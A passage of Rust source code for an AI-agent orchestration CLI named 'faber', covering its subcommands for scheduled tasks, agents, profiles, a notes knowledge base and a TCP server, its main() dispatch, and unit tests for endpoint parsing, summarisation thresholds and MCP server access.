        #[clap(long, requires = "cron")]
        max_runs: Option<i64>,
        /// Run it on this agent
        #[clap(long, conflicts_with_all = ["profile", "any"])]
        agent: Option<String>,
        /// Run it on a new agent made from this profile
        #[clap(long, conflicts_with = "any")]
        profile: Option<String>,
        /// Run it on whichever agent is free first
        #[clap(long)]
        any: bool,
        /// Its name in `faber tasks`
        #[clap(long)]
        name: Option<String>,
        /// Wait for these tasks instead (can be repeated)
        #[clap(long = "after", value_name = "ID", conflicts_with = "no_deps")]
        depends_on: Vec<i64>,
        /// Wait for no other task
        #[clap(long)]
        no_deps: bool,
        /// Run it in this directory
        #[clap(long, value_name = "DIR", conflicts_with = "no_cwd")]
        cwd: Option<String>,
        /// Run it where its agent works
        #[clap(long)]
        no_cwd: bool,
    },
    /// Put scheduled tasks on hold, so they aren't picked up even when due
    Hold {
        /// The ids of the tasks, as `faber tasks` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
    },
    /// Release held tasks, so they're picked up again (right away if due)
    Release {
        /// The ids of the tasks, as `faber tasks` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
    },
    /// Print what's done for a task as it's done, by whichever agents -
    /// its sub-agents and fan-out workers too - until Ctrl-C
    Follow {
        /// The task's id, as `faber tasks` lists it
        id: i64,
        /// Show the reasoning too
        #[clap(long)]
        reasoning: bool,
    },
    /// Stop running tasks: whoever runs them interrupts them, and their
    /// sub-agents (recorded as failed: "stopped")
    Stop {
        /// The ids of the tasks, as `faber tasks` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
    },
    /// Run tasks now: whatever they're waiting for - their time, a
    /// release, being enabled - or, if done, again. Dependencies still
    /// have to be met
    Run {
        /// The ids of the tasks, as `faber tasks` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
    },
    /// Change where tasks that aren't running or done yet run: on an agent, on a
    /// new agent made from a profile, or on any agent
    #[clap(group(clap::ArgGroup::new("target").required(true).args(["agent", "profile", "any"])))]
    Assign {
        /// The ids of the tasks, as `faber tasks` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
        /// Only this agent may pick them up
        #[clap(long)]
        agent: Option<String>,
        /// Run them on a new agent made from this profile
        #[clap(long)]
        profile: Option<String>,
        /// Whichever agent is free first picks them up
        #[clap(long)]
        any: bool,
    },
}

#[derive(Debug, Clone, Subcommand)]
enum AgentsAction {
    /// Show one agent in detail, with the conversation it had (a finished
    /// sub-agent's is kept until `faber gc`)
    Show {
        name: String,
        /// Show every message in full instead of its start
        #[clap(long)]
        full: bool,
    },
    /// Print what agents do as they do it - every agent's, or only this
    /// one's - until Ctrl-C: their input, answers, tool calls and how each
    /// turn ended, wherever they run
    Follow {
        name: Option<String>,
        /// Only what was done for this task, by whichever agents
        #[clap(long, conflicts_with = "name")]
        task: Option<i64>,
        /// Show the reasoning too
        #[clap(long)]
        reasoning: bool,
    },
    /// Change an agent's settings that only you, not an agent, may change
    /// (created if needed)
    Set {
        name: String,
        /// Give it the unsafe tools (unsandboxed commands, web access) in
        /// any session, and let it give them to agents it makes
        #[clap(long, conflicts_with = "safe")]
        r#unsafe: bool,
        /// Take the unsafe tools away (a session started with
        /// --unsafe-tools still gives them to its own agent)
        #[clap(long)]
        safe: bool,
        /// Work in this directory: its tools' relative paths, its commands,
        /// all its sandbox can write to. Agents it makes work there too
        #[clap(long, value_name = "DIR", conflicts_with = "no_cwd")]
        cwd: Option<String>,
        /// Work in the current directory of whatever runs it again
        #[clap(long)]
        no_cwd: bool,
        /// Copy this profile's settings (the database's or the config
        /// file's) first; the settings given below are set over them
        #[clap(long)]
        profile: Option<String>,
        #[clap(flatten)]
        settings: SettingsArgs,
    },
    /// Send an agent a message: it gets it as soon as it's free, however
    /// it runs (a chat, a worker) - it's a task for it
    Message {
        name: String,
        /// What to tell it
        text: String,
    },
    /// Remove the finished agents that agents made - sub-agents, task
    /// agents, fan-out workers - with nothing running them or below them.
    /// Agents you made stay (unlike `faber gc`)
    Cleanup {
        /// Only show which
        #[clap(long)]
        dry_run: bool,
    },
}

/// Settings of an agent, or of a profile, to change from the command
/// line: each given is set - or, given empty, cleared - and the rest left.
#[derive(Debug, Clone, clap::Args)]
struct SettingsArgs {
    /// What it's for
    #[clap(long)]
    description: Option<String>,
    #[clap(long)]
    model: Option<String>,
    #[clap(long)]
    endpoint: Option<String>,
    /// Added to its instructions
    #[clap(long)]
    system_prompt: Option<String>,
    #[clap(long, value_name = "N")]
    max_tokens: Option<String>,
    #[clap(long, value_name = "N")]
    context_window: Option<String>,
    /// The only tools it may use, comma-separated; "all" for no limit
    #[clap(long, value_name = "LIST")]
    tools: Option<String>,
    /// Request parameters, as a JSON object, e.g. '{"temperature": 0.2}'
    #[clap(long, value_name = "JSON")]
    parameters: Option<String>,
    /// The MCP servers whose tools it gets, comma-separated; "none" for
    /// none, empty for the default (none, but every one for a session's
    /// own agent)
    #[clap(long, value_name = "LIST")]
    mcp_servers: Option<String>,
}

impl SettingsArgs {
    fn is_empty(&self) -> bool {
        [
            &self.description,
            &self.model,
            &self.endpoint,
            &self.system_prompt,
            &self.max_tokens,
            &self.context_window,
            &self.tools,
            &self.parameters,
            &self.mcp_servers,
        ]
        .iter()
        .all(|v| v.is_none())
    }

    /// `profile` with these changes made.
    fn apply(&self, mut profile: Profile) -> Result<Profile, String> {
        let text = |v: &Option<String>, current: Option<String>| match v {
            None => current,
            Some(v) if v.trim().is_empty() => None,
            Some(v) => Some(v.clone()),
        };
        let number = |v: &Option<String>, current: Option<u32>, what: &str| match v {
            None => Ok(current),
            Some(v) if v.trim().is_empty() => Ok(None),
            Some(v) => v
                .trim()
                .parse::<u32>()
                .ok()
                .filter(|n| *n > 0)
                .map(Some)
                .ok_or_else(|| format!("--{} wants a positive number, not '{}'", what, v)),
        };
        profile.description = text(&self.description, profile.description);
        profile.model = text(&self.model, profile.model);
        profile.endpoint = text(&self.endpoint, profile.endpoint);
        profile.system_prompt = text(&self.system_prompt, profile.system_prompt);
        profile.max_tokens = number(&self.max_tokens, profile.max_tokens, "max-tokens")?;
        profile.context_window = number(
            &self.context_window,
            profile.context_window,
            "context-window",
        )?;
        if let Some(tools) = &self.tools {
            profile.tools = match tools.trim() {
                "" | "all" => None,
                list => {
                    let known = initialize_tools(true, None);
                    let names: Vec<String> =
                        list.split(',').map(|t| t.trim().to_string()).collect();
                    if let Some(bad) = names.iter().find(|t| !known.contains_key(t.as_str())) {
                        return Err(format!("no tool named '{}'", bad));
                    }
                    Some(names)
                }
            };
        }
        if let Some(servers) = &self.mcp_servers {
            profile.mcp_servers = parse_mcp_servers_setting(servers);
        }
        if let Some(parameters) = &self.parameters {
            profile.parameters = match parameters.trim() {
                "" => None,
                json => match serde_json::from_str::<serde_json::Value>(json) {
                    Ok(serde_json::Value::Object(map)) if map.is_empty() => None,
                    Ok(serde_json::Value::Object(map)) => Some(map),
                    _ => return Err("--parameters wants a JSON object".to_string()),
                },
            };
        }
        Ok(profile)
    }
}

/// An agent's config as profile-shaped settings, to change with
/// `SettingsArgs` and copy back (`apply_settings`).
fn agent_settings(config: &db::AgentConfig, description: &str) -> Profile {
    Profile {
        description: (!description.is_empty()).then(|| description.to_string()),
        model: config.model.clone(),
        endpoint: config.endpoint.clone(),
        api_key: config.api_key.clone(),
        max_tokens: config.max_tokens,
        context_window: config.context_window,
        parameters: config.parameters.clone(),
        system_prompt: config.system_prompt.clone(),
        tools: config.tools.clone(),
        mcp_servers: config.mcp_servers.clone(),
    }
}

/// An `mcp_servers` setting as given: empty for the default, "none" for
/// none, else the servers' names, comma-separated.
fn parse_mcp_servers_setting(text: &str) -> Option<Vec<String>> {
    match text.trim() {
        "" => None,
        "none" => Some(Vec::new()),
        list => Some(
            list.split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect(),
        ),
    }
}

/// `config` with `settings` copied in: what an agent's config shares with
/// a profile - its unsafe tools, directory and profile stay.
fn apply_settings(mut config: db::AgentConfig, settings: &Profile) -> db::AgentConfig {
    config.model = settings.model.clone();
    config.endpoint = settings.endpoint.clone();
    config.api_key = settings.api_key.clone();
    config.max_tokens = settings.max_tokens;
    config.context_window = settings.context_window;
    config.parameters = settings.parameters.clone();
    config.system_prompt = settings.system_prompt.clone();
    config.tools = settings.tools.clone();
    config.mcp_servers = settings.mcp_servers.clone();
    config
}

#[derive(Debug, Clone, Subcommand)]
enum ProfilesAction {
    /// Make or change a profile in the database, shared by every session
    /// using it (the config file's are changed there)
    Set {
        name: String,
        #[clap(flatten)]
        settings: SettingsArgs,
    },
    /// Remove a profile from the database (agents made from it keep their
    /// settings)
    Delete { name: String },
}

#[derive(Debug, Clone, Subcommand)]
enum KbAction {
    /// Ranked full-text search over the notes
    Search {
        /// What to look for, in words
        query: String,
        /// Only notes with this tag
        #[clap(long)]
        tag: Option<String>,
        /// Most results to show
        #[clap(long, default_value = "10")]
        limit: usize,
    },
    /// Show a note in full, by id or title
    Show {
        /// The note's id, as `faber kb` lists it, or its title
        note: String,
    },
    /// Add a note, or replace the one with the same title
    Add {
        /// The note's title
        title: String,
        /// The note's text; read from stdin if not given
        body: Option<String>,
        /// A tag for the note (can be repeated)
        #[clap(long = "tag")]
        tags: Vec<String>,
        /// Make it private to this agent instead of shared with all
        #[clap(long)]
        agent: Option<String>,
    },
    /// Delete notes
    Rm {
        /// The ids of the notes, as `faber kb` lists them
        #[clap(required = true)]
        ids: Vec<i64>,
    },
}

#[derive(Debug, Clone, Subcommand)]
enum CliCommand {
    /// Pass a request to the AI model and print its response
    Prompt {
        /// Prompt command to pass to the AI model
        prompt: String,
        /// List of files that are loaded and used as system context
        files: Vec<String>,
    },

    /// Interactive session
    Chat {},

    /// List available models from the configured endpoint
    Models {},

    /// List all available tools
    ListTools {},

    /// Remove dormant agents (no active session)
    Gc {},

    /// Work through scheduled tasks headlessly, as an agent: prompt tasks
    /// for it (or for any agent), and tool tasks - like an idle `faber chat`,
    /// without a terminal. Run several, e.g. next to `faber serve`, to work
    /// through a queue in parallel
    Worker {
        /// The agent to work as (created if needed); default: worker-<pid>
        #[clap(long)]
        agent: Option<String>,
        /// At most this many prompt tasks at once; default: no limit. Each
        /// runs on its own agent, except those for this agent by name,
        /// which run as it, one at a time. To limit how hard the model is
        /// pushed, use --max-parallel-requests
        #[clap(long)]
        parallel: Option<usize>,
        /// Only take on tasks bound to these profiles (comma-separated) of
        /// the config file's; default: all of them. Tasks bound to no
        /// profile are taken on either way
        #[clap(long = "profile", value_delimiter = ',')]
        profiles: Vec<String>,
    },

    /// List the profiles to make agents from - the config file's and the
    /// database's - or make, change or remove one in the database
    Profiles {
        #[clap(subcommand)]
        action: Option<ProfilesAction>,
    },

    /// Show the agents as a tree by who spawned whom, with what each is
    /// doing - or, with `show`, one agent and its conversation
    Agents {
        #[clap(subcommand)]
        action: Option<AgentsAction>,
        /// Keep the tree on screen, refreshed every 2 seconds (or every N
        /// with --watch=N), until Ctrl-C
        #[clap(long, value_name = "N", num_args = 0..=1, require_equals = true, default_missing_value = "2")]
        watch: Option<u64>,
    },

    /// Show the knowledge base the agents keep (kb_* tools) - or, with a
    /// subcommand, search, show, add or delete notes
    Kb {
        #[clap(subcommand)]
        action: Option<KbAction>,
        /// Only notes with this tag
        #[clap(long)]
        tag: Option<String>,
        /// Only the N most recently updated notes
        #[clap(long, default_value = "50")]
        last: usize,
    },

    /// Show scheduled tasks: their status, schedule and how their last run
    /// went - or, with `add`, create one
    Tasks {
        #[clap(subcommand)]
        action: Option<TasksAction>,
        /// Only tasks created, started or run since then: how long ago
        /// (e.g. 30m, 2h, 3d, 1w) or a date/time (2026-10-01,
        /// "2026-10-01 14:00", 2026-10-01T14:00:00Z)
        #[clap(long)]
        since: Option<String>,
        /// Only the N most recently active tasks
        #[clap(long)]
        last: Option<usize>,
        /// Only this agent's tasks
        #[clap(long, conflicts_with = "profile")]
        agent: Option<String>,
        /// Only tasks that run on this profile
        #[clap(long)]
        profile: Option<String>,
        /// Keep the table on screen, refreshed every 2 seconds (or every
        /// N with --watch=N), until Ctrl-C
        #[clap(long, value_name = "N", num_args = 0..=1, require_equals = true, default_missing_value = "2")]
        watch: Option<u64>,
        /// Show the tasks as a board, one column per state, instead of a table
        #[clap(long)]
        board: bool,
    },

    /// Start a server sharing the database with other faber processes
    /// over TCP, and a web UI to watch the agents and manage the tasks at
    /// http://<bind>/ui/ (profiles to run tasks on come from the config)
    Serve {
        /// Address to bind to
        #[clap(long, default_value = "127.0.0.1:9090")]
        bind: String,
        /// Read the key clients must give from this file (first line).
        /// Without it, a new key is made each start, and written where
        /// clients on this machine find it
        #[clap(long)]
        auth_key_file: Option<String>,
        /// Serve with no key at all: anything on this machine that can
        /// connect - any user, any process - can then do what the user
        /// can. Only for a bind address on the loopback interface
        #[clap(long)]
        no_auth: bool,
        /// Also work through tasks as this agent, like `faber worker
        /// --agent NAME` running inside the server. Repeat for more agents.
        /// If a chat has the agent, it waits for it to be free
        #[clap(long = "run-agent", value_name = "NAME")]
        run_agents: Vec<String>,
    },
}

fn main() -> Result<(), Box<dyn Error>> {
    let env = Env::new()
        // warn!()-level messages (e.g. a single LaTeX block failing to
        // render) are routine enough, and can be frequent enough in one
        // response, that showing them by default is its own kind of
        // spam - only error!() shows without an explicit RUST_LOG.
        .filter_or("RUST_LOG", "error")
        .write_style_or("LOG_STYLE", "always");
    env_logger::Builder::from_env(env).init();

    // Parse command line arguments
    let mut opts = Opts::parse();
    debug!("Command line options parsed");

    // Commands that just print and exit should end quietly when their
    // output is cut short (`faber tasks | head`), like any other CLI tool,
    // instead of panicking on the broken pipe. Only those: chat and serve
    // write to sockets, where a peer hanging up must not kill the process.
    if matches!(
        opts.command,
        CliCommand::Tasks { .. }
            | CliCommand::Kb { .. }
            | CliCommand::Agents { .. }
            | CliCommand::Models {}
            | CliCommand::ListTools {}
            | CliCommand::Profiles { action: None }
            | CliCommand::Gc {}
    ) {
        unsafe {
            libc::signal(libc::SIGPIPE, libc::SIG_DFL);
        }
    }

    // Load and merge configuration file
    // Without -c, the user's own config file - never one in the current
    // directory, which is where agents work and could write one.
    let config_path = match &opts.config {
        Some(path) => Some(path.clone()),
        None => default_config_file()
            .filter(|path| path.is_file())
            .map(|path| path.display().to_string()),
    };
    if let Some(config_file) = &config_path {
        match Opts::load_from_file(config_file) {
            Ok(config) => {
                debug!("Loaded configuration file: {}", config_file);
                opts.merge_with_config(config);
            }
            Err(e) => {
                return Err(format!("Configuration file error: {}", e).into());
            }
        }
    }

    // With the config file's db_path, when it has one.
    if let Some(path) = &opts.db_path {
        if let (Some(rest), Some(home)) = (path.strip_prefix("~/"), std::env::var_os("HOME")) {
            opts.db_path = Some(PathBuf::from(home).join(rest).display().to_string());
        }
    }
    set_faber_files(config_path.as_deref(), opts.db_path.as_deref());
    opts.apply_mcp_server_flags()?;
    // Commands that run agents: never where faber keeps its own files.
    if matches!(
        opts.command,
        CliCommand::Prompt { .. }
            | CliCommand::Chat {}
            | CliCommand::Worker { .. }
            | CliCommand::Serve { .. }
    ) {
        check_no_faber_files(&std::env::current_dir()?)?;
    }

    lsp::configure(&opts.lsp_servers)?;
    validate_profiles(&opts.profiles).map_err(|e| format!("Configuration file error: {}", e))?;
    openai::set_max_parallel_requests(opts.max_parallel_requests.unwrap_or(0));
    if let Some(retention) = &opts.task_retention {
        parse_duration(retention).ok_or_else(|| {
            format!(
                "can't read task_retention '{}': use a duration like 30d or 2w",
                retention
            )
        })?;
    }

    // Reset the model to use if an endpoint was provided
    if opts.model.is_none() && opts.endpoint.is_some() {
        opts.model = Some("".to_string());
    }

    let mut db_conn_for_history: Option<Arc<Mutex<rusqlite::Connection>>> = None;
    let db_connection: Option<Arc<dyn DbBackend>> = if let Some(ref server_addr) = opts.server {
        debug!("Connecting to remote server at: {}", server_addr);
        let remote = remote_db::RemoteDb::connect(server_addr)?;
        let key = match &opts.server_key_file {
            Some(file) => Some(read_key_file(file)?),
            // A server on this machine: the key it wrote for its port.
            None => server_key_path(server_addr)
                .filter(|path| is_loopback_address(server_addr) && path.is_file())
                .map(|path| read_key_file(&path.display().to_string()))
                .transpose()?,
        };
        if let Some(ref k) = key {
            remote.authenticate(k)?;
        }
        Some(Arc::new(remote))
    } else if let Some(ref db_path) = opts.db_path {
        debug!("Opening SQLite database at: {}", db_path);
        let conn = if matches!(
            opts.command,
            CliCommand::Tasks {
                action: None | Some(TasksAction::Show { .. }),
                ..
            } | CliCommand::Kb {
                action: None | Some(KbAction::Search { .. }) | Some(KbAction::Show { .. }),
                ..
            } | CliCommand::Agents {
                action: None | Some(AgentsAction::Show { .. }) | Some(AgentsAction::Follow { .. }),
                ..
            } | CliCommand::Tasks {
                action: Some(TasksAction::Follow { .. }),
                ..
            }
        ) {
            // Only looks: never create or migrate a database for it.
            db::open_read_only(db_path)?
        } else {
            if let Some(dir) = std::path::Path::new(db_path).parent() {
                if !dir.as_os_str().is_empty() {
                    std::fs::create_dir_all(dir)?;
                }
            }
            let conn = rusqlite::Connection::open(db_path)?;
            db::initialize_db(&conn)?;
            conn
        };
        let conn = Arc::new(Mutex::new(conn));
        db_conn_for_history = Some(conn.clone());
        Some(Arc::new(LocalDb::new(conn)))
    } else {
        debug!("No db_path configured, database tools will be unavailable");
        None
    };

    let mcp_manager: Option<Arc<faber::mcp::McpManager>> = if !opts.mcp_servers.is_empty() {
        match faber::mcp::McpManager::new(opts.mcp_servers.clone()) {
            Ok(mgr) => Some(Arc::new(mgr)),
            Err(e) => {
                return Err(format!("Failed to initialize MCP servers: {}", e).into());
            }
        }
    } else {
        None
    };

    // Execute the chosen command
    let result = match &opts.command {
        CliCommand::Prompt { prompt, files } => prompt_command(
            &prompt,
            &files,
            &opts,
            db_connection.clone(),
            mcp_manager.clone(),
        ),
        CliCommand::Chat {} => chat_command(
            &opts,
            db_connection.clone(),
            db_conn_for_history.clone(),
            mcp_manager.clone(),
        ),
        CliCommand::Models {} => list_models_command(&opts),
        CliCommand::ListTools {} => list_tools_command(&mcp_manager),
        CliCommand::Gc {} => gc_command(&opts),
        CliCommand::Worker {
            agent,
            parallel,
            profiles,
        } => worker_command(
            &opts,
            db_connection.clone(),
            mcp_manager.clone(),
            agent.clone(),
            *parallel,
            profiles,
        ),
        CliCommand::Agents { action, watch } => {
            agents_command(&opts, &db_connection, action.as_ref(), *watch)
        }
        CliCommand::Profiles { action } => {
            profiles_command(&opts, &db_connection, action.as_ref())
        }
        CliCommand::Kb { action, tag, last } => {
            kb_command(&db_connection, action.as_ref(), tag.as_deref(), *last)
        }
        CliCommand::Tasks {
            action:
                Some(TasksAction::Prune {
                    older_than,
                    done,
                    dry_run,
                }),
            ..
        } => prune_tasks_command(&db_connection, older_than.as_deref(), *done, *dry_run),
        CliCommand::Tasks {
            action: Some(TasksAction::Show { id, json }),
            ..
        } => show_task_command(&db_connection, *id, *json),
        CliCommand::Tasks {
            action: Some(TasksAction::Hold { ids }),
            ..
        } => hold_tasks_command(&db_connection, ids, true),
        CliCommand::Tasks {
            action: Some(TasksAction::Release { ids }),
            ..
        } => hold_tasks_command(&db_connection, ids, false),
        CliCommand::Tasks {
            action: Some(TasksAction::Run { ids }),
            ..
        } => run_tasks_command(&db_connection, ids),
        CliCommand::Tasks {
            action: Some(edit @ TasksAction::Edit { .. }),
            ..
        } => edit_task_command(&db_connection, edit),
        CliCommand::Tasks {
            action: Some(TasksAction::Stop { ids }),
            ..
        } => stop_tasks_command(&db_connection, ids),
        CliCommand::Tasks {
            action: Some(TasksAction::Follow { id, reasoning }),
            ..
        } => match &db_connection {
            Some(db) => follow_events(db.as_ref(), None, Some(*id), *reasoning),
            None => Err("No database configured: set 'db_path' in your config file, or use --db-path or --server.".into()),
        },
        CliCommand::Tasks {
            action:
                Some(TasksAction::Assign {
                    ids,
                    agent,
                    profile,
                    ..
                }),
            ..
        } => {
            warn_unknown_profile(&opts, profile.as_deref());
            assign_tasks_command(&db_connection, ids, agent.as_deref(), profile.as_deref())
        }
        CliCommand::Tasks {
            action: Some(action),
            ..
        } => {
            if let TasksAction::Add { profile, .. } = action {
                warn_unknown_profile(&opts, profile.as_deref());
            }
            add_task_command(&db_connection, action)
        }
        CliCommand::Tasks {
            action: None,
            since,
            last,
            agent,
            profile,
            watch,
            board,
        } => tasks_command(
            &db_connection,
            since.as_deref(),
            *last,
            agent.as_deref(),
            profile.as_deref(),
            *watch,
            *board,
        ),
        CliCommand::Serve {
            bind,
            auth_key_file,
            no_auth,
            run_agents,
        } => {
            let (Some(conn), Some(db)) = (db_conn_for_history.clone(), db_connection.clone())
            else {
                return Err("--db-path is required for serve command".into());
            };
            let key = match (auth_key_file, no_auth) {
                (Some(_), true) => return Err("give --auth-key-file or --no-auth, not both".into()),
                (Some(file), false) => Some(read_key_file(file)?),
                (None, true) if !is_loopback_address(bind) => {
                    return Err(format!(
                        "--no-auth would let anyone who can reach {} do what you can: only for a \
                         loopback address (127.0.0.1)",
                        bind
                    )
                    .into());
                }
                (None, true) => None,
                (None, false) => Some(write_server_key(bind)?),
            };
            let profiles = opts.profiles.clone();
            let workers = run_agents
                .iter()
                .enumerate()
                .map(|(i, agent)| {
                    if agent.trim().is_empty() {
                        return Err("--run-agent needs an agent name".into());
                    }
                    Ok(WorkerSpec {
                        agent: agent.clone(),
                        parallel: None,
                        profiles: worker_profiles(&opts, &[])?,
                        wait_for_agent: true,
                        tool_tasks: i == 0,
                        label: true,
                    })
                })
                .collect::<Result<Vec<_>, Box<dyn Error>>>()?;
            let stop = WorkerStop::default();
            std::thread::scope(|scope| {
                if !workers.is_empty() {
                    {
                        let stop = stop.clone();
                        ctrlc::set_handler(move || stop.stop())?;
                    }
                    let handles: Vec<_> = workers
                        .iter()
                        .map(|spec| {
                            let (opts, db, mcp_manager, stop) = (&opts, &db, &mcp_manager, &stop);
                            scope.spawn(move || {
                                if let Err(e) =
                                    run_worker(opts, db.clone(), mcp_manager, spec, stop)
                                {
                                    eprintln!("Agent '{}' stopped: {}", spec.agent, e);
                                }
                            })
                        })
                        .collect();
                    let (mcp_manager, stop) = (&mcp_manager, &stop);
                    // On Ctrl-C, once the agents have stopped, so does the
                    // server.
                    scope.spawn(move || {
                        for handle in handles {
                            let _ = handle.join();
                        }
                        if stop.stopped() {
                            if let Some(mcp) = mcp_manager {
                                mcp.shutdown();
                            }
                            std::process::exit(0);
                        }
                    });
                }
                let mut mcp_servers: Vec<String> = opts.mcp_servers.keys().cloned().collect();
                mcp_servers.sort();
                let _ = web::MCP_SERVERS.set(mcp_servers);
                server::serve_command(bind, conn, key.as_deref(), profiles)
            })
        }
    };

    if let Some(ref mcp) = mcp_manager {
        mcp.shutdown();
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustyline::history::{History, SearchDirection};

    /// A one-shot task, the short way: a tool call runs as one, anything
    /// else is an instruction for an agent; with no command, the
    /// description is it.
    trait OneshotTasks {
        fn create_oneshot_task(
            &self,
            name: &str,
            description: &str,
            run_at: &str,
            command: &str,
            agent_name: Option<&str>,
        ) -> Result<i64, Box<dyn Error>>;
    }

    impl OneshotTasks for dyn DbBackend {
        fn create_oneshot_task(
            &self,
            name: &str,
            description: &str,
            run_at: &str,
            command: &str,
            agent_name: Option<&str>,
        ) -> Result<i64, Box<dyn Error>> {
            let command = if command.trim().is_empty() {
                description
            } else {
                command
            };
            let kind = if command.trim().is_empty() || db::is_tool_call(command) {
                db::TaskKind::TOOL
            } else {
                db::TaskKind::PROMPT
            };
            self.create_task(&db::NewTask {
                name: name.to_string(),
                description: description.to_string(),
                kind: kind.to_string(),
                command: command.to_string(),
                agent_name: agent_name.map(String::from),
                schedule: db::TaskSchedule::Once {
                    at: run_at.to_string(),
                },
                held: false,
                depends_on: Vec::new(),
                profile: None,
                run_safe: false,
                cwd: None,
            })
        }
    }

    #[test]
    fn test_models_endpoint_from_chat_completions_suffix() {
        assert_eq!(
            models_endpoint_from("http://localhost:8080/v1/chat/completions"),
            "http://localhost:8080/v1/models"
        );
    }

    #[test]
    fn test_models_endpoint_from_trailing_slash() {
        assert_eq!(
            models_endpoint_from("http://localhost:8080/v1/"),
            "http://localhost:8080/v1/models"
        );
    }

    #[test]
    fn test_models_endpoint_from_no_trailing_slash() {
        assert_eq!(
            models_endpoint_from("http://localhost:8080/v1"),
            "http://localhost:8080/v1/models"
        );
    }

    #[test]
    fn test_should_summarize_proactively_below_margin_is_false() {
        // 79% of a 1000-token window - just under the 80% margin.
        assert!(!should_summarize_proactively(Some(790), Some(1000)));
    }

    #[test]
    fn test_should_summarize_proactively_at_or_above_margin_is_true() {
        assert!(should_summarize_proactively(Some(800), Some(1000)));
        assert!(should_summarize_proactively(Some(950), Some(1000)));
    }

    #[test]
    fn test_should_summarize_proactively_unknown_inputs_are_false() {
        // Neither piece of information available yet (or ever, if the
        // model isn't in a /models listing and --context-window wasn't
        // given) - never fire blindly.
        assert!(!should_summarize_proactively(None, None));
        assert!(!should_summarize_proactively(Some(999_999), None));
        assert!(!should_summarize_proactively(None, Some(1000)));
    }

    #[test]
    fn test_should_summarize_proactively_zero_window_is_false() {
        // Guards the division: a reported context_length of 0 (unusual,
        // but not something to trust blindly) must not be treated as
        // "always exceeded" via a 0/0 or divide-by-zero artifact.
        assert!(!should_summarize_proactively(Some(0), Some(0)));
        assert!(!should_summarize_proactively(Some(5), Some(0)));
    }

    #[test]
    fn test_parse_mcp_server_flag_http() {
        let (name, config) = parse_mcp_server_flag("search=http://localhost:3000/mcp").unwrap();
        assert_eq!(name, "search");
        assert_eq!(config.url.as_deref(), Some("http://localhost:3000/mcp"));
        assert_eq!(config.sse, None);
        assert_eq!(config.command, None);
    }

    #[test]
    fn test_parse_mcp_server_flag_sse() {
        let (name, config) = parse_mcp_server_flag("search=sse:http://localhost:3000/sse").unwrap();
        assert_eq!(name, "search");
        assert_eq!(config.sse.as_deref(), Some("http://localhost:3000/sse"));
        assert_eq!(config.url, None);
    }

    #[test]
    fn test_parse_mcp_server_flag_url_may_contain_equals_signs() {
        // split_once must only split on the FIRST '=', so a query string in
        // the URL doesn't get truncated or misparsed.
        let (name, config) =
            parse_mcp_server_flag("search=http://localhost:3000/mcp?token=abc=def").unwrap();
        assert_eq!(name, "search");
        assert_eq!(
            config.url.as_deref(),
            Some("http://localhost:3000/mcp?token=abc=def")
        );
    }

    #[test]
    fn test_parse_mcp_server_flag_missing_equals_is_an_error() {
        assert!(parse_mcp_server_flag("no-equals-sign-here").is_err());
    }

    #[test]
    fn test_parse_mcp_server_flag_empty_name_is_an_error() {
        assert!(parse_mcp_server_flag("=http://localhost:3000/mcp").is_err());
    }

    #[test]
    fn test_parse_mcp_server_flag_empty_url_is_an_error() {
        assert!(parse_mcp_server_flag("search=").is_err());
    }

    /// A stdio MCP server with one tool, named by $TOOL.
    fn fake_mcp_server(tool: &str) -> Option<faber::mcp::McpServerConfig> {
        let python = latex_kitty::resolve_on_path("python3")?;
        let script = r#"import sys, json, os
for line in sys.stdin:
    m = json.loads(line)
    if "id" not in m: continue
    r = {"protocolVersion": "2024-11-05", "capabilities": {}, "serverInfo": {"name": "f", "version": "1"}}
    if m["method"] == "tools/list": r = {"tools": [{"name": os.environ["TOOL"], "inputSchema": {"type": "object"}}]}
    print(json.dumps({"jsonrpc": "2.0", "id": m["id"], "result": r}), flush=True)
"#;
        Some(faber::mcp::McpServerConfig {
            command: Some(python.display().to_string()),
            args: Some(vec!["-c".to_string(), script.to_string()]),
            env: Some(HashMap::from([("TOOL".to_string(), tool.to_string())])),
            url: None,
            sse: None,
            headers: None,
        })
    }

    #[test]
    fn test_the_sessions_agent_gets_every_mcp_server_and_others_only_theirs() {
        let (Some(github), Some(jira)) = (fake_mcp_server("issues"), fake_mcp_server("tickets"))
        else {
            eprintln!("python3 not installed, skipping");
            return;
        };
        let manager = Some(Arc::new(
            faber::mcp::McpManager::new(HashMap::from([
                ("github".to_string(), github),
                ("jira".to_string(), jira),
            ]))
            .unwrap(),
        ));
        let servers = |access: Option<faber::mcp::McpAccess>| {
            let mut names = access.unwrap().servers().to_vec();
            names.sort();
            names
        };
        let unset = db::AgentConfig::default();
        let listed = db::AgentConfig {
            mcp_servers: Some(vec!["jira".to_string()]),
            ..Default::default()
        };
        let mut opts = Opts::default();
        // The session's own agent: every server, unless its config lists.
        assert_eq!(
            servers(session_mcp(&manager, &unset, &opts)),
            ["github", "jira"]
        );
        assert_eq!(servers(session_mcp(&manager, &listed, &opts)), ["jira"]);
        // --mcp-server NAME adds to what it lists.
        opts.mcp_granted = vec!["github".to_string()];
        assert_eq!(
            servers(session_mcp(&manager, &listed, &opts)),
            ["github", "jira"]
        );
        // --no-tools: none at all.
        opts.no_tools = true;
        assert!(servers(session_mcp(&manager, &unset, &opts)).is_empty());
        // Any other agent: only what its config lists.
        assert!(servers(agent_mcp(manager.as_ref(), &unset)).is_empty());
        let access = agent_mcp(manager.as_ref(), &listed).unwrap();
        assert!(access.has_tool("mcp_jira_tickets") && !access.has_tool("mcp_github_issues"));
        // With no MCP servers at all, no access.
        assert!(session_mcp(&None, &unset, &Opts::default()).is_none());
        manager.unwrap().shutdown();
    }

    #[test]
    fn test_mcp_server_flag_names_a_defined_server_or_adds_one() {
        let mut opts = Opts::default();
        opts.mcp_servers.insert(
            "github".to_string(),
            faber::mcp::McpServerConfig {
                command: Some("gh-mcp".to_string()),
                args: None,
                env: None,
                url: None,
                sse: None,
                headers: None,
            },
        );
        opts.mcp_server = vec![
            "github".to_string(),
            "docs=http://docs.example/mcp".to_string(),
        ];
        opts.apply_mcp_server_flags().unwrap();
        assert_eq!(opts.mcp_granted, ["github", "docs"]);
        assert!(opts.mcp_servers.contains_key("docs"));
        let mut opts = Opts::default();
